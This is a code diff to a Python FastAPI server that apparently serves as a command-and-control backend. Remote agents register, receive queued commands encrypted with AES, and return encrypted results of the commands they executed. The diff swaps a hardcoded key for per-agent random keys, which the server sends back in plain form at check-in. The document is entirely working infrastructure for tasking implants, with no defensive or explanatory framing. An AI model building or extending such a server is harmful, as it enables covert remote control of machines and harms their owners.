@@ -1,15 +1,12 @@
 from fastapi import FastAPI, WebSocket, HTTPException
-import asyncio
-import json
 from pydantic import BaseModel
 from typing import Dict
 import logging
 import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-import uvicorn
-import importlib.util
 import os
+import uvicorn
 
 app = FastAPI()
 agents: Dict[str, Dict] = {}
@@ -46,12 +43,12 @@ class CommandRequest(BaseModel):
     AgentID: str
     Command: str
 
-# Load AES Key (Ensure it is 32 bytes for AES-256)
-key_b64 = "ywD3S70cYF56DLw3GHYA9MzCflWAMcljQKXbanqc="  # Replace with your actual 32-byte key
-key = base64.b64decode(key_b64)
+def generate_aes_key() -> str:
+    key = os.urandom(32)  # Generate a 32-byte key for AES-256
+    return base64.b64encode(key).decode('utf-8')
 
 def check_key_length(key: bytes) -> bytes:
-    if len(key) not in [16, 24, 32]:
+    if len(key) != 32:
         raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
     return key
 
@@ -79,20 +76,30 @@ def decrypt_data(data: str, key: bytes) -> str:
 def checkin(request: CheckinRequest):
     agent_id = request.AgentID
     if agent_id not in agents:
-        agents[agent_id] = {"commands": []}
-        logger.info(f"New agent registered: {agent_id}")
+        key_b64 = generate_aes_key()
+        key = base64.b64decode(key_b64)
+        agents[agent_id] = {"key": key, "commands": []}
+        logger.info(f"New agent registered: {agent_id} with key length {len(key)}")
 
+        # Send the base64 encoded key back to the client
+        return {"key": key_b64, "message": "New agent registered"}
+
+    key = agents[agent_id]["key"]
     if agents[agent_id]["commands"]:
         command = agents[agent_id]["commands"].pop(0)
         response = encrypt_data(command, key)
     else:
         response = encrypt_data("NoCommand", key)
 
-    return {"key": key_b64, "data": response}
+    return {"key": "", "data": response}
 
 @app.post("/result")
 def result(request: ResultRequest):
     agent_id = request.AgentID
+    key = agents.get(agent_id, {}).get("key")
+    if not key:
+        raise HTTPException(status_code=404, detail="Agent not found")
+
     try:
         decrypted_result = decrypt_data(request.Result, key)
         message = f"Agent {agent_id} executed command with result: {decrypted_result}"
@@ -100,9 +107,6 @@ def result(request: ResultRequest):
     except Exception as e:
         logger.error(f"Failed to process result from agent {agent_id}: {str(e)}")
         raise HTTPException(status_code=400, detail="Decryption failed")
-
-    if agent_id not in agents:
-        raise HTTPException(status_code=404, detail="Agent not found")
 
     return {"Status": "OK"}
 
